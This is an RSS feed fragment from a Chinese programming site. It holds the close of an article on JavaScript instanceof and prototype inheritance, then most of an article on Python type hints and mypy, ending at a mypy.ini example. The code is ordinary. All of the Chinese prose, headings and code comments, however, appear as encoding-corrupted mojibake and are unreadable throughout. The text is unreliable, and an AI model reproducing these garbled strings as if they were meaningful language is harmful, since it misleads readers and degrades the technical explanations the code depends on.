<p>è¦çœŸæ­£ç†è§£ <code>instanceof</code> çš„æ„ä¹‰ï¼Œè¿˜éœ€äº†è§£ JavaScript ä¸­å¸¸è§çš„ç»§æ‰¿æ¨¡å¼ã€‚å› ä¸º <code>instanceof</code> åˆ¤æ–­çš„æ˜¯â€œåŸå‹ç»§æ‰¿å…³ç³»â€ï¼Œè€Œéâ€œå±æ€§æ‹·è´â€ã€‚</p>
<h4 data-id="heading-6">1. æ„é€ å‡½æ•°ç»‘å®šï¼ˆå€Ÿç”¨æ„é€ å‡½æ•°ï¼‰</h4>
<p>é€šè¿‡ <code>call</code> æˆ– <code>apply</code> è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå°†å±æ€§å¤åˆ¶åˆ°å­ç±»å®ä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">'åŠ¨ç‰©'</span>;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// ç»§æ‰¿å±æ€§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå¯ä¼ å‚ï¼Œé¿å…å¼•ç”¨å…±äº«ã€‚<br/>
<strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•ç»§æ‰¿çˆ¶ç±»åŸå‹ä¸Šçš„æ–¹æ³•ï¼Œ<code>cat instanceof Animal</code> ä¸º <code>false</code>ã€‚</p>
<h4 data-id="heading-7">2. åŸå‹é“¾ç»§æ‰¿ï¼ˆprototype æ¨¡å¼ï¼‰</h4>
<p>å°†çˆ¶ç±»çš„å®ä¾‹è®¾ä¸ºå­ç±»çš„åŸå‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Cat.prototype</span> = new Animal()<span class="hljs-comment">;</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">; // ä¿®æ­£ constructor</span>
</code></pre>
<p>æ­¤æ—¶ï¼Œ<code>new Cat()</code> çš„åŸå‹é“¾åŒ…å« <code>Animal.prototype</code>ï¼Œå› æ­¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'å°é»‘'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•å‘çˆ¶ç±»æ„é€ å‡½æ•°ä¼ å‚ï¼›æ‰€æœ‰å­ç±»å®ä¾‹å…±äº«çˆ¶ç±»å®ä¾‹çš„å±æ€§ï¼ˆè‹¥çˆ¶ç±»æœ‰å¼•ç”¨ç±»å‹å±æ€§ï¼Œä¼šç›¸äº’å½±å“ï¼‰ã€‚</p>
<h4 data-id="heading-8">3. ç»„åˆç»§æ‰¿ï¼ˆæ¨èï¼‰</h4>
<p>ç»“åˆä¸Šè¿°ä¸¤ç§æ–¹å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">function Cat(name) {
    Animal.call(this)<span class="hljs-comment">; // ç»§æ‰¿å±æ€§</span>
    <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">;</span>
}
<span class="hljs-attr">Cat.prototype</span> = new Animal()<span class="hljs-comment">; // ç»§æ‰¿æ–¹æ³•</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">;</span>
</code></pre>
<p>æ—¢å¯ä¼ å‚ï¼Œåˆèƒ½æ­£ç¡®å»ºç«‹åŸå‹é“¾ï¼Œä½¿å¾— <code>instanceof</code> åˆ¤æ–­æœ‰æ•ˆã€‚</p>
<h4 data-id="heading-9">4. ç›´æ¥ç»§æ‰¿ prototypeï¼ˆéœ€è°¨æ…ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Cat.prototype</span> = Animal.prototype<span class="hljs-comment">;</span>
</code></pre>
<p>è™½ç„¶èŠ‚çœå†…å­˜ï¼Œä½†ä¼šå¯¼è‡´ <code>Cat.prototype.constructor</code> æŒ‡å‘ <code>Animal</code>ï¼Œä¸”ä¿®æ”¹ <code>Cat.prototype</code> ä¼šç›´æ¥å½±å“ <code>Animal.prototype</code>ï¼Œç ´åå°è£…æ€§ã€‚</p>
<hr/>
<h3 data-id="heading-10">äº”ã€ä¸ºä»€ä¹ˆ instanceof åœ¨å¤§å‹é¡¹ç›®ä¸­å¾ˆé‡è¦ï¼Ÿ</h3>
<p>åœ¨å¤æ‚ç³»ç»Ÿä¸­ï¼Œå¯¹è±¡å¯èƒ½æ¥è‡ªå¤šä¸ªæ¨¡å—ã€ç¬¬ä¸‰æ–¹åº“ï¼Œç”šè‡³åŠ¨æ€ç”Ÿæˆã€‚å¼€å‘è€…å¾€å¾€ä¸æ¸…æ¥šæŸä¸ªå¯¹è±¡åˆ°åº•â€œæ˜¯è°çš„å­©å­â€ã€‚æ­¤æ—¶ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>typeof</code> åªèƒ½åŒºåˆ†åŸºæœ¬ç±»å‹ï¼›</li>
<li>ä½¿ç”¨ <code>Object.prototype.toString.call()</code> è™½å¯è¯†åˆ«å†…ç½®ç±»å‹ï¼Œä½†å¯¹è‡ªå®šä¹‰ç±»æ— èƒ½ä¸ºåŠ›ï¼›</li>
<li><strong><code>instanceof</code> æä¾›äº†åŸºäºâ€œç»§æ‰¿å…³ç³»â€çš„è¯­ä¹‰åŒ–åˆ¤æ–­</strong>ï¼Œæ˜¯ç±»å‹å®‰å…¨çš„é‡è¦ä¿éšœã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">handleEntity</span>(entity) {
    if (entity instanceof User) {
        entity<span class="hljs-selector-class">.login</span>();
    } else if (entity instanceof Product) {
        entity<span class="hljs-selector-class">.display</span>();
    }
}
</code></pre>
<p>è¿™ç§åŸºäºç±»å‹çš„åˆ†å‘é€»è¾‘ï¼Œä¾èµ–äºæ­£ç¡®çš„åŸå‹é“¾è®¾è®¡å’Œ <code>instanceof</code> åˆ¤æ–­ã€‚</p>
<hr/>
<h3 data-id="heading-11">å…­ã€æ€»ç»“</h3>
<p><code>instanceof</code> ä¸ä»…ä»…æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå®ƒä½“ç°äº† JavaScript åŸå‹ç»§æ‰¿çš„æ ¸å¿ƒæ€æƒ³ã€‚é€šè¿‡æ‰‹å†™ <code>isInstanceOf</code>ï¼Œæˆ‘ä»¬ä¸ä»…æŒæ¡äº†å…¶å·¥ä½œåŸç†ï¼Œä¹ŸåŠ æ·±äº†å¯¹åŸå‹é“¾çš„ç†è§£ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œåˆç†ä½¿ç”¨ç»§æ‰¿æ¨¡å¼ï¼ˆå¦‚ç»„åˆç»§æ‰¿ï¼‰ï¼Œé…åˆ <code>instanceof</code> è¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œèƒ½å¤Ÿæ˜¾è‘—æå‡ä»£ç çš„å¯ç»´æŠ¤æ€§ä¸å¥å£®æ€§ã€‚</p>
<p>åœ¨ ES6+ æ—¶ä»£ï¼Œè™½ç„¶ <code>class</code> è¯­æ³•ç³–è®©ç»§æ‰¿çœ‹èµ·æ¥æ›´â€œä¼ ç»Ÿâ€ï¼Œä½†å…¶åº•å±‚ä¾ç„¶æ˜¯åŸºäºåŸå‹é“¾ã€‚å› æ­¤ï¼Œæ— è®ºè¯­æ³•å¦‚ä½•æ¼”è¿›ï¼Œ<strong>ç†è§£åŸå‹æœºåˆ¶å§‹ç»ˆæ˜¯æŒæ¡ JavaScript é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å…³é”®</strong>ã€‚</p>
<p>æ­£å¦‚é‚£å¥è€è¯ï¼šâ€œçŸ¥å…¶ç„¶ï¼Œæ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚â€â€”â€”æ‰‹å†™ <code>instanceof</code>ï¼Œæ­£æ˜¯é€šå¾€è¿™ä¸€å¢ƒç•Œçš„ä¸€æ¡æ·å¾„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ ]]></title>    <link>https://juejin.cn/post/7580740782933458986</link>    <guid>https://juejin.cn/post/7580740782933458986</guid>    <pubDate>2025-12-08T05:45:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933458986" data-draft-id="7581081334850093097" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:45:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:45:51.000Z" title="Mon Dec 08 2025 05:45:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šå‡½æ•°è¿”å›å€¼ç±»å‹ä¸å¯¹ï¼Œè·‘äº†ä¸€æ™šä¸Šæ‰å‘ç°é—®é¢˜ï¼›æˆ–è€…æ¥æ‰‹è€ä»£ç ï¼Œçœ‹åˆ°ä¸€å †å‚æ•°å®Œå…¨ä¸çŸ¥é“ä¼ ä»€ä¹ˆç±»å‹ï¼›åˆæˆ–è€…æ˜æ˜ä¼ äº†ä¸ªå­—ç¬¦ä¸²ï¼Œä»£ç å´æœŸæœ›æ˜¯ä¸ªå­—å…¸ã€‚</p>
<p>ç„¶åä½ ç™¾åº¦äº†ä¸€åœˆï¼ŒStack Overflowç¿»äº†ä¸‰é¡µï¼Œæœ€åå‘ç°ï¼šåŸæ¥Pythonä¹Ÿèƒ½å†™ç±»å‹æ³¨è§£ï¼</p>
<p>ä»Šå¤©å’±ä»¬å°±æ¥å½»åº•ææ‡‚è¿™ä¸ªè®©ä»£ç å¥å£®å¦‚é’¢é“ä¾ çš„ç¥å™¨ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯ç±»å‹æ³¨è§£ï¼Ÿåˆ«è¢«"ç±»å‹"ä¿©å­—å“åˆ°</h2>
<p>è¯´ç™½äº†ï¼Œç±»å‹æ³¨è§£å°±æ˜¯ç»™å˜é‡å’Œå‡½æ•°è´´æ ‡ç­¾ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä»¥å‰æˆ‘ä»¬è¿™ä¹ˆå†™ï¼ˆè£¸å¥”çŠ¶æ€ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">return</span> a + b

<span class="hljs-comment"># ç°åœ¨æˆ‘ä»¬è¿™ä¹ˆå†™ï¼ˆç©¿ä¸Šè¡£æœï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b
</code></pre>
<p>çœ‹åˆ°æ²¡ï¼Ÿ<code>: int</code> å°±æ˜¯å‘Šè¯‰ç¨‹åºå‘˜ï¼š"è¿™é‡Œè¦æ•´æ•°"ï¼Œ<code>-&gt; int</code> æ˜¯è¯´ï¼š"è¿™é‡Œè¿”å›æ•´æ•°"ã€‚</p>
<p><strong>ä½†æ˜¯é‡ç‚¹æ¥äº†ï¼šPythonè§£é‡Šå™¨æ ¹æœ¬ä¸é¸Ÿè¿™äº›æ³¨è§£ï¼</strong></p>
<p>ä½ å†™äº†ç±»å‹æ³¨è§£ï¼Œä½†ä¼ ä¸ªå­—ç¬¦ä¸²è¿›å»ï¼Œä»£ç ç…§æ ·è·‘ï¼ˆç›´åˆ°è¿è¡Œæ—¶å‡ºé”™ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b

result = add(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"world"</span>)  <span class="hljs-comment"># è¿”å› "helloworld"ï¼Œè§£é‡Šå™¨æ¯«æ— æ€¨è¨€</span>
</code></pre>
<p>è¿™æ—¶å€™å°±éœ€è¦ <strong>mypy</strong> å‡ºåœºäº†ï¼</p>
<h2 data-id="heading-1">mypyï¼šPythonçš„é™æ€ç±»å‹æ£€æŸ¥å™¨</h2>
<p>mypyå°±åƒä½ ä»£ç çš„ä¿é•–ï¼Œåœ¨ä»£ç è¿è¡Œå‰å°±å¸®ä½ æŠŠæ½œåœ¨é—®é¢˜æªå‡ºæ¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£…mypyï¼ˆPython 3.9+ï¼‰</span>
python3 -m pip install mypy
<span class="hljs-meta prompt_">
# </span><span class="bash">æ£€æŸ¥ä½ çš„ä»£ç </span>
mypy your_file.py
</code></pre>
<p>è¿˜æ˜¯åˆšæ‰é‚£ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># test.py</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b

result = add(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"world"</span>)  <span class="hljs-comment"># è¿™é‡Œä¼šæŠ¥é”™ï¼</span>
</code></pre>
<p>è¿è¡Œmypyæ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash">mypy test.py</span>
error: Argument 1 to "add" has incompatible type "str"; expected "int"
error: Argument 2 to "add" has incompatible type "str"; expected "int"
Found 2 errors in 1 file (checked 1 source file)
</code></pre>
<p>çœ‹åˆ°äº†å—ï¼Ÿ<strong>ä¸ç”¨è¿è¡Œä»£ç ï¼Œmypyå°±èƒ½å‘ç°ç±»å‹é”™è¯¯ï¼</strong></p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨ç”¨mypyçš„åŸå› ï¼š<strong>æŠŠbugæ‰¼æ€åœ¨æ‘‡ç¯®é‡Œ</strong>ã€‚</p>
<h2 data-id="heading-2">å¸¸ç”¨ç±»å‹æ³¨è§£è¯­æ³•å¤§å…¨</h2>
<h3 data-id="heading-3">åŸºç¡€ç±»å‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºæœ¬ç±»å‹</span>
name: <span class="hljs-built_in">str</span> = <span class="hljs-string">"å¼ ä¸‰"</span>
age: <span class="hljs-built_in">int</span> = <span class="hljs-number">25</span>
height: <span class="hljs-built_in">float</span> = <span class="hljs-number">1.75</span>
is_student: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>

<span class="hljs-comment"># é›†åˆç±»å‹</span>
scores: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = [<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">88</span>]  <span class="hljs-comment"># Python 3.9+ å†™æ³•</span>
scores: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>] = [<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">88</span>]  <span class="hljs-comment"># è€ç‰ˆæœ¬å†™æ³•ï¼ˆéœ€è¦from typing import Listï¼‰</span>

<span class="hljs-comment"># å­—å…¸ç±»å‹</span>
student_info: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"class"</span>: <span class="hljs-string">"ä¸‰å¹´çº§äºŒç­"</span>}
student_info: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"class"</span>: <span class="hljs-string">"ä¸‰å¹´çº§äºŒç­"</span>}

<span class="hljs-comment"># å¯é€‰ç±»å‹ï¼ˆå¯èƒ½ä¸ºNoneï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_name</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:  <span class="hljs-comment"># Python 3.10+</span>
    <span class="hljs-keyword">if</span> user_id == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·"</span> + <span class="hljs-built_in">str</span>(user_id)

<span class="hljs-comment"># è€ç‰ˆæœ¬å†™æ³•</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_name</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-keyword">if</span> user_id == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·"</span> + <span class="hljs-built_in">str</span>(user_id)
</code></pre>
<h3 data-id="heading-4">å‡½æ•°ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Callable</span>

<span class="hljs-comment"># å‡½æ•°ä½œä¸ºå‚æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>], processor: <span class="hljs-type">Callable</span>[[<span class="hljs-built_in">int</span>], <span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-keyword">return</span> [processor(item) <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">to_string</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æ•°å­—ï¼š<span class="hljs-subst">{num}</span>"</span>

result = process_data([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], to_string)  <span class="hljs-comment"># ["æ•°å­—ï¼š1", "æ•°å­—ï¼š2", "æ•°å­—ï¼š3"]</span>
</code></pre>
<h3 data-id="heading-5">ç±»çš„ç±»å‹æ³¨è§£</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, age: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
        self.name = name
        self.age = age

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_info</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{self.name}</span>, <span class="hljs-subst">{self.age}</span>å²"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">have_birthday</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        self.age += <span class="hljs-number">1</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>() -&gt; User:
    <span class="hljs-keyword">return</span> User(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">30</span>)
</code></pre>
<h2 data-id="heading-6">mypyè¿›é˜¶ç©æ³•</h2>
<h3 data-id="heading-7">ä¸¥æ ¼æ¨¡å¼</h3>
<p>æƒ³è®©mypyæ›´ä¸¥æ ¼ï¼ŸåŠ ä¸Šè¿™äº›å‚æ•°ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æœ€ä¸¥æ ¼çš„æ£€æŸ¥</span>
mypy --strict your_file.py
<span class="hljs-meta prompt_">
# </span><span class="bash">å¸¸ç”¨ä¸¥æ ¼é€‰é¡¹</span>
mypy --disallow-untyped-defs --disallow-incomplete-defs your_file.py
</code></pre>
<h3 data-id="heading-8">é…ç½®æ–‡ä»¶</h3>
<p>åˆ›å»º <code>mypy.ini</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[mypy]</span>
<span class="hljs-attr">python_version</span> = <span class="hljs-number">3.9</span>
<span class="hljs-attr">warn_return_any</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unused_configs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_untyped_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_incomplete_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">check_untyped_defs</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">disallow_untyped_decorators</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">no_implicit_optional</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_redundant_casts</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unused_ignores</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_no_return</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">warn_unreachable</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">strict_equality</span> = <span class="hljs-literal">True</span>
</code></pre>
